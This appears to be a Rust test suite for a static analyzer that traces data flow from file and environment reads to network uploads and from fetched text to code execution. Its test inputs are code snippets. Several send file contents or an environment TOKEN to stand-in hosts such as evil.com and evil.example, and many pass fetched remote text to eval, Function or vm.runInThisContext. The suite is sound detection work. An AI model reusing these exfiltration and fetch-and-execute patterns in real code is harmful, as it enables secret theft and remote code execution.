    assert_eq!(edge_count(&plan), 1);
    let edge = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .find(|edge| port(&plan, &edge.from) == Some(&Port::Value))
        .unwrap();
    let producer = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .find(|incoming| incoming.to == edge.from && resource_op(&plan, &incoming.from).is_some())
        .unwrap();
    let res = format!(
        "{:?}",
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .find(|node| node.id == producer.from)
            .unwrap()
            .occurrence
    );
    assert!(
        res.contains("/y"),
        "edge should come from the /y read: {res}"
    );
}

#[test]
fn py_rebound_variable_drops_the_edge() {
    let plan = py("import requests\n\
                   d = open(\"/x\").read()\n\
                   d = \"safe\"\n\
                   requests.post(\"http://evil.com\", data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_no_shared_variable_no_edge() {
    let plan = py("import requests\n\
                   open(\"/x\").read()\n\
                   requests.post(\"http://evil.com\", data=\"literal\")\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_plain_plan_retains_the_resource_occurrence() {
    let plan = py("open(\"/x\").read()\n");
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .any(|node| matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "filesystem.read"
            ))
    );
    assert!(effinterp_proto::canonical_json(&plan).contains("causality"));
}

// --- JavaScript: positive / negative ---

#[test]
fn js_var_mediated_read_reaches_network() {
    let plan = js("const fs = require(\"fs\");\n\
                   const d = fs.readFileSync(\"/x\");\n\
                   fetch(\"http://e.com\", {method: \"POST\", body: d});\n");
    assert!(
        data_flow_edge(&plan, "filesystem.read", "network.upload"),
        "expected a data_flow edge from the read to the network upload"
    );
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_direct_nested_read_reaches_network() {
    let plan = js("const fs = require(\"fs\");\n\
                   fetch(\"http://e.com\", {method: \"POST\", body: fs.readFileSync(\"/x\")});\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_no_shared_variable_omits_the_graph() {
    let plan = js("const fs = require(\"fs\");\n\
                   fs.readFileSync(\"/x\");\n\
                   fetch(\"http://e.com\", {method: \"POST\", body: \"literal\"});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_shadowed_process_receiver_does_not_create_environment_flow() {
    let real = js("function load() { const t = process.env.TOKEN; fetch('/x', {body: t}) } load()");
    assert!(
        real.effects
            .iter()
            .any(|effect| effect.operation.0 == "environment.read")
    );

    let shadowed = js(
        "function load({ process }) { const t = process.env.TOKEN; fetch('/x', {body: t}) } load(fake)",
    );
    assert!(
        !shadowed
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "environment.read")
    );
    assert_eq!(edge_count(&shadowed), 0);
}

#[test]
fn js_environment_body_and_header_reach_the_network_operation() {
    let upload = js(
        "const token = process.env.TOKEN; fetch('https://evil.example/c', {method: 'POST', body: token})",
    );
    assert!(data_flow_edge(
        &upload,
        "environment.read",
        "network.upload"
    ));

    let request =
        js("fetch('https://evil.example/c', {headers: {Authorization: process.env.TOKEN}})");
    assert!(data_flow_edge(
        &request,
        "environment.read",
        "network.request"
    ));
}

#[test]
fn py_environment_body_and_header_reach_the_network_operation() {
    let upload = py(
        "import os, requests\ntoken = os.environ['TOKEN']\nrequests.post('https://evil.example/c', data=token)",
    );
    assert!(data_flow_edge(
        &upload,
        "environment.read",
        "network.upload"
    ));

    let request = py(
        "import os, requests\nrequests.get('https://evil.example/c', headers={'Authorization': os.getenv('TOKEN')})",
    );
    assert!(data_flow_edge(
        &request,
        "environment.read",
        "network.request"
    ));
}

// --- Adversarial negatives: constructs the conservative model must not guess
// through. Each pairs a clear producer (a read) with a clear consumer (an
// upload/request); the only path to an edge runs through the unsupported
// construct, so a zero edge count proves no path was invented. ---

/// Whether the plan records an `unresolved_call` boundary (an unmodeled callee).
fn has_unresolved_boundary(plan: &Plan) -> bool {
    plan.boundaries
        .iter()
        .any(|b| b.reason.as_str() == "unresolved_call")
}

// Python

#[test]
fn py_branch_local_assignment_no_edge() {
    // The producer is bound only inside an `if`; after the join the variable's
    // producer is ambiguous (the branch may not have run), so no edge forms.
    let plan = py("import requests\n\
                   d = 'safe'\n\
                   if flag:\n    \
                       d = open('/x').read()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_loop_carried_assignment_no_edge() {
    // A variable assigned in a loop body has no single unambiguous producer at
    // the point of use after the loop.
    let plan = py("import requests\n\
                   for p in ['/x']:\n    \
                       d = open(p).read()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_two_branch_producers_no_edge() {
    // Two candidate producers for one consumed value: neither is THE producer.
    let plan = py("import requests\n\
                   if flag:\n    \
                       d = open('/x').read()\n\
                   else:\n    \
                       d = open('/y').read()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_transform_rebinding_drops_edge() {
    // The producer var is rebound to a non-producer transform before the use.
    let plan = py("import requests\n\
                   d = open('/x').read()\n\
                   d = d.upper()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_tuple_destructuring_no_edge() {
    // Destructuring a producer's result splits it across names we do not track.
    let plan = py("import requests\n\
                   a, b = open('/x').read(), 'y'\n\
                   requests.post('http://e.com', data=a)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_container_element_no_edge() {
    // Storing a producer's result in a list element and reading it back.
    let plan = py("import requests\n\
                   box = [open('/x').read()]\n\
                   requests.post('http://e.com', data=box[0])\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_object_field_no_edge() {
    // Storing a producer's result in a dict field and reading it back.
    let plan = py("import requests\n\
                   obj = {}\n\
                   obj['k'] = open('/x').read()\n\
                   requests.post('http://e.com', data=obj['k'])\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_function_return_carries_only_returned_reads() {
    // The read happens inside a helper and its value is returned, so the
    // helper's summary carries it across the return to the caller's post.
    let plan = py("import requests\n\
                   def get_data():\n    \
                       return open('/x').read()\n\
                   d = get_data()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 1);
    // A helper that reads but returns other text carries no read.
    let plan = py("import requests\n\
                   def get_data():\n    \
                       x = open('/x').read()\n    \
                       return 'ping'\n\
                   d = get_data()\n\
                   requests.post('http://e.com', data=d)\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_shadowed_param_no_edge() {
    // A module-level producer var `d` is shadowed by a parameter `d`; the use
    // inside the helper is a different binding and must not link to the module
    // producer.
    let plan = py("import requests\n\
                   d = open('/x').read()\n\
                   def send(d):\n    \
                       requests.post('http://e.com', data=d)\n\
                   send('safe')\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn py_unmodeled_consumer_no_edge() {
    // The consumer's effect model is unknown (an unmodeled import), so it forms
    // no stage to receive an edge; coverage degrades via an unresolved boundary.
    let plan = py("import weirdlib\n\
                   d = open('/x').read()\n\
                   weirdlib.send(d)\n");
    assert_eq!(edge_count(&plan), 0);
    assert!(has_unresolved_boundary(&plan));
}

// JavaScript / TypeScript

#[test]
fn js_branch_local_assignment_no_edge() {
    let plan = js("const fs = require('fs');\n\
                   let d = 'safe';\n\
                   if (flag) { d = fs.readFileSync('/x'); }\n\
                   fetch('http://e.com', {method: 'POST', body: d});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_loop_carried_assignment_no_edge() {
    let plan = js("const fs = require('fs');\n\
                   let d;\n\
                   for (const p of paths) { d = fs.readFileSync(p); }\n\
                   fetch('http://e.com', {method: 'POST', body: d});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_two_branch_producers_no_edge() {
    let plan = js("const fs = require('fs');\n\
                   let d;\n\
                   if (flag) { d = fs.readFileSync('/x'); } else { d = fs.readFileSync('/y'); }\n\
                   fetch('http://e.com', {method: 'POST', body: d});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_array_destructuring_carries_the_selected_element() {
    let plan = js("const fs = require('fs');\n\
                   const [a, b] = [fs.readFileSync('/x'), 'y'];\n\
                   fetch('http://e.com', {method: 'POST', body: a});\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_object_field_carries_the_assigned_value() {
    let plan = js("const fs = require('fs');\n\
                   const obj = {};\n\
                   obj.k = fs.readFileSync('/x');\n\
                   fetch('http://e.com', {method: 'POST', body: obj.k});\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_awaited_producer_reaches_the_consumer() {
    let plan = js("const fs = require('fs/promises');\n\
                   async function f() {\n\
                     const d = await fs.readFile('/x');\n\
                     fetch('http://e.com', {method: 'POST', body: d});\n\
                   }\n\
                   f();\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_fetched_body_reaches_dynamic_code_execution_on_the_success_path() {
    fn on_success_path(condition: &effinterp_proto::Condition) -> bool {
        match condition {
            effinterp_proto::Condition::Atom { atom } => {
                atom.origin.kind == effinterp_proto::ConditionKind::ShortCircuit
                    && atom.polarity == Some(true)
            }
            effinterp_proto::Condition::All { conditions }
            | effinterp_proto::Condition::Any { conditions } => {
                conditions.iter().all(on_success_path)
            }
            effinterp_proto::Condition::Widened => false,
        }
    }
    for source in [
        "fetch('https://e.com/x').then(r => r.text()).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).then(t => eval(t));",
        "fetch('https://e.com/x').then(async r => { const t = await r.text(); new Function(t)(); });",
        "fetch('https://e.com/x').then(r => r.text()).then(t => Function(t)());",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { const f = new Function(t); f(); });",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { const f = Function(t); f(); });",
        // A finalizer or a handler whose throw cannot escape passes the text on.
        "fetch('https://e.com/x').then(r => r.text()).finally(() => console.log('done')).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { try { throw 'handled'; } catch {} return t; }).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { if (false) throw 'never'; return t; }).then(eval);",
        // A parameter elsewhere does not shadow the global `eval` used here.
        "function helper(eval) { return eval; } fetch('https://e.com/x').then(r => r.text()).then(eval);",
        // A block's own `f`, or an assignment that may not run, leaves the
        // compiled `f` callable.
        "fetch('https://e.com/x').then(r => r.text()).then(t => { const f = new Function(t); { const f = console.log; } f(); });",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { let f = new Function(t); if (false) f = console.log; f(); });",
        // No executor shape, origin or later statement is taken as proof that
        // a promise never fulfills, so a later handler stays on the success
        // path.
        "new Promise(function () { arguments[0](); }).then(() => fetch('https://e.com/x').then(r => r.text()).then(eval));",
        "new Promise(function (resolve) { arguments[0](); }).then(() => fetch('https://e.com/x').then(r => r.text()).then(eval));",
        "const Promise = { reject: x => globalThis.Promise.resolve(x) }; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).finally(() => { return; return Promise.reject('never'); }).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).finally(() => { try { return; } catch {} return Promise.reject('never'); }).then(eval);",
        // No promise's origin proves it rejects or never settles: any promise
        // exposes the runtime `Promise` through `.constructor`, where
        // `reject` can be replaced.
        "Promise.reject = Promise.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "Promise['reject'] = Promise.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "Object.assign(Promise, { reject: Promise.resolve }); fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const P = Promise; P.reject = P.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "globalThis.Promise.reject = Promise.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const P = Promise.prototype.constructor; P.reject = Promise.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "Object.assign(Promise.prototype.constructor, { reject: Promise.resolve }); fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "Promise.__defineGetter__('reject', () => Promise.resolve); fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const { constructor: P } = Promise.prototype; P.reject = Promise.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const P = Promise.resolve().constructor; P.reject = P.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const P = new Promise(() => {}).constructor; P.reject = P.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "const P = Promise.all([]).constructor; P.reject = P.resolve; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "Promise.resolve().constructor.reject = function (x) { return this.resolve(x); }; fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        // Formerly conditional, now accepted over-blocks: an unmodified
        // `Promise.reject` and a never-settling `new Promise` are no longer
        // taken as proof that the handler cannot run.
        "fetch('https://e.com/x').then(r => r.text()).then(t => Promise.reject(t)).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).finally(() => Promise.reject('ok')).then(eval);",
        "new Promise(() => {}).then(() => fetch('https://e.com/x').then(r => r.text()).then(eval));",
        // A program that could replace how a leading `throw` settles its
        // chain declines that proof too, one case per kind of tripwire.
        "Object.prototype.x = 1; fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "Reflect.ownKeys({}); fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "o.then = null; fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "const o = { then() {} }; fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "o[k] = 1; fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "(async () => { const r = await fetch('https://e.com/x'); eval(await r.text()); })();",
        "(async () => { const r = await fetch('https://e.com/x'); require('vm').runInThisContext(await r.json()); })();",
        // An `http(s).get` body streams to `data` listeners; an `end`
        // listener reads what they accumulated.
        "require('https').get('https://e.com/x', r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); });",
        "require('http').get('http://e.com/x', {}, r => { const b = []; r.on('data', c => b.push(c)); r.once('end', () => eval(Buffer.concat(b).toString())); });",
        "require('https').get('https://e.com/x', function (r) { var s = ''; r.on('data', function (c) { s = s + c.toString(); }); r.on('end', function () { new Function(s)(); }); });",
        "require('https').get('https://e.com/x', r => r.on('data', c => require('vm').runInThisContext(c.toString())));",
        "require('https').get('https://e.com/x', r => r.on('data', eval));",
    ] {
        let plan = js(source);
        let graph = plan.causality.graph.as_ref().expect("causality detail");
        assert!(
            graph.nodes.iter().any(|node| {
                resource_op(&plan, &node.id) == Some("network.request")
                    && value_reaches_operation(&plan, &node.id, "process.code_execution")
            }),
            "{source}"
        );
        let execution = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "process.code_execution")
            .expect("code execution");
        assert!(
            execution.condition.as_ref().is_none_or(on_success_path),
            "{source}"
        );
    }
    // Logging, compiling without calling, a replaced `eval` and a `Response`
    // object, which is not its body, run no fetched code.
    for source in [
        "fetch('https://e.com/x').then(r => r.text()).then(console.log);",
        "fetch('https://e.com/x').then(r => r.text()).then(t => new Function(t));",
        "fetch('https://e.com/x').then(r => r.text()).then(t => { let f = new Function(t); f = console.log; f(t); });",
        "fetch('https://e.com/x').then(r => r.text()).then(t => require('vm').compileFunction(t));",
        "var eval = console.log; fetch('https://e.com/x').then(r => r.text()).then(eval);",
        "fetch('https://e.com/x').then(eval);",
        "fetch('https://e.com/x').then(r => eval(r));",
        "(async () => { const r = await fetch('https://e.com/x'); eval(r); })();",
        "require('https').get('https://e.com/x', r => { let d = ''; r.on('data', c => d += c); r.on('end', () => console.log(d)); });",
    ] {
        let plan = js(source);
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "network.request"),
            "{source}"
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "process.code_execution"),
            "{source}"
        );
    }
    // A response object renders as `[object ...]`: the code it runs is not
    // the fetched body.
    for source in [
        "(async () => { const r = await fetch('https://e.com/x'); eval(r.toString()); })();",
        "require('https').get('https://e.com/x', r => r.on('end', () => eval(r.toString())));",
    ] {
        let plan = js(source);
        let graph = plan.causality.graph.as_ref().expect("causality detail");
        assert!(
            !graph.nodes.iter().any(|node| {
                resource_op(&plan, &node.id) == Some("network.request")
                    && value_reaches_operation(&plan, &node.id, "process.code_execution")
            }),
            "{source}"
        );
    }
    let compiled = js("require('vm').compileFunction(\"require('fs').rmSync('/x')\");");
    assert!(
        !compiled
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    // A handler after one whose first statement throws runs only if that
    // promise fulfills anyway, and a `close` listener runs whether or not
    // the body arrived.
    for source in [
        "fetch('https://e.com/x').then(r => r.text()).then(t => { throw t; }).then(eval);",
        "fetch('https://e.com/x').then(r => r.text()).finally(function () { throw 'stop'; }).then(eval);",
        "require('https').get('https://e.com/x', r => { let d = ''; r.on('data', c => d += c); r.on('close', () => eval(d)); });",
    ] {
        let plan = js(source);
        let executions = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.code_execution")
            .collect::<Vec<_>>();
        assert!(!executions.is_empty(), "{source}");
        assert!(
            executions.iter().all(|effect| effect
                .condition
                .as_ref()
                .is_some_and(|c| !on_success_path(c))),
            "{source}"
        );
    }
}

#[test]
fn js_finally_chain_preserves_the_awaited_producer() {
    let plan = js("const fs = require('fs/promises');\n\
                   async function f() {\n\
                     const d = await fs.readFile('/x').finally(() => {});\n\
                     fetch('http://e.com', {method: 'POST', body: d});\n\
                   }\n\
                   f();\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
    assert!(!has_unresolved_boundary(&plan));
}

#[test]
fn js_object_and_array_spreads_keep_property_identity() {
    let plan = js("const fs = require('fs');\n\
                   const source = { payload: fs.readFileSync('/x') };\n\
                   const copy = { ...source };\n\
                   const values = ['safe', copy.payload];\n\
                   const spread = [...values];\n\
                   fetch('http://e.com', {method: 'POST', body: spread[1]});\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_later_safe_spread_overwrites_the_producer() {
    let plan = js("const fs = require('fs');\n\
                   const produced = { payload: fs.readFileSync('/x') };\n\
                   const safe = { payload: 'safe' };\n\
                   const copy = { ...produced, ...safe };\n\
                   fetch('http://e.com', {method: 'POST', body: copy.payload});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_unknown_object_spread_drops_stale_properties() {
    let plan = js("const fs = require('fs');\n\
                   function getUnknown() { return globalThis.value; }\n\
                   const produced = { payload: fs.readFileSync('/x') };\n\
                   const unknown = getUnknown();\n\
                   const copy = { ...produced, ...unknown };\n\
                   fetch('http://e.com', {method: 'POST', body: copy.payload});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_unknown_computed_write_drops_stale_properties() {
    let plan = js("const fs = require('fs');\n\
                   const copy = { payload: fs.readFileSync('/x') };\n\
                   copy[key] = 'safe';\n\
                   fetch('http://e.com', {method: 'POST', body: copy.payload});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_function_return_carries_the_returned_value() {
    let plan = js("const fs = require('fs');\n\
                   function getData() { return fs.readFileSync('/x'); }\n\
                   const d = getData();\n\
                   fetch('http://e.com', {method: 'POST', body: d});\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

#[test]
fn js_function_return_uses_the_callee_local_binding() {
    let plan = js("const fs = require('fs');\n\
                   function getData() {\n\
                     const d = fs.readFileSync('/secret');\n\
                     return d;\n\
                   }\n\
                   const d = fs.readFileSync('/other');\n\
                   const value = getData();\n\
                   fetch('http://e.com', {method: 'POST', body: value});\n");
    assert_eq!(edge_count(&plan), 1);
    let edge = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .find(|edge| port(&plan, &edge.from) == Some(&Port::Value))
        .unwrap();
    let producer = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .find(|incoming| incoming.to == edge.from && resource_op(&plan, &incoming.from).is_some())
        .unwrap();
    let resource = format!(
        "{:?}",
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .find(|node| node.id == producer.from)
            .unwrap()
            .occurrence
    );
    assert!(resource.contains("/secret"), "producer was {resource}");
    assert!(!resource.contains("/other"), "producer was {resource}");
}

#[test]
fn js_unknown_array_spread_does_not_renumber_following_values() {
    let plan = js("const fs = require('fs');\n\
                   function getList() { return globalThis.value; }\n\
                   const unknown = getList();\n\
                   const values = [...unknown, fs.readFileSync('/x')];\n\
                   fetch('http://e.com', {method: 'POST', body: values[0]});\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_shadowed_param_no_edge() {
    let plan = js("const fs = require('fs');\n\
                   function send(d) { fetch('http://e.com', {method: 'POST', body: d}); }\n\
                   const d = fs.readFileSync('/x');\n\
                   send(d);\n");
    assert_eq!(edge_count(&plan), 0);
}

#[test]
fn js_unmodeled_consumer_no_edge() {
    let plan = js("const fs = require('fs');\n\
                   const d = fs.readFileSync('/x');\n\
                   sink(d);\n");
    assert_eq!(edge_count(&plan), 0);
    assert!(has_unresolved_boundary(&plan));
}

/// An unresolved call contributes an unknown continuation so that later sites
/// stay optional. It is not itself a modeled successful completion: when a
/// recognized abort removes the callable's only real success exit, nothing is
/// left to intersect and no occurrence is required. Publishing one here would
/// tell permission synthesis a deletion always happens in a program that never
/// completes normally.
#[test]
fn unknown_continuations_do_not_witness_a_successful_completion() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (language, aborting, completing) in [
        (
            "python",
            "import os\nos.remove('/sink')\nhelper()\nraise ValueError('x')\n",
            "import os\nos.remove('/sink')\nhelper()\n",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"/sink\"); helper(); panic(\"x\") }",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"/sink\"); helper() }",
        ),
        (
            "php",
            "<?php unlink('/sink'); helper(); throw new Exception('x');",
            "<?php unlink('/sink'); helper();",
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { Files.delete(Path.of(\"/sink\")); throw new RuntimeException(\"x\"); } }",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { Files.delete(Path.of(\"/sink\")); } }",
        ),
    ] {
        for (source, modality) in [
            (aborting, Modality::May),
            (completing, Modality::MustOnSuccess),
        ] {
            let plan = Engine::new()
                .analyze(&Subject::Source {
                    language: language.into(),
                    dialect: None,
                    source: source.into(),
                    cwd: Some("/work".into()),
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            let effects: Vec<_> = plan
                .effects
                .iter()
                .filter(|effect| {
                    effect.operation.0 == "filesystem.delete"
                        && matches!(&effect.resource,
                            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                                if path == "/sink")
                })
                .collect();
            assert_eq!(effects.len(), 1, "{language}: {:?}", plan.effects);
            assert_eq!(effects[0].modality, modality, "{language} {source}");
        }
    }
}
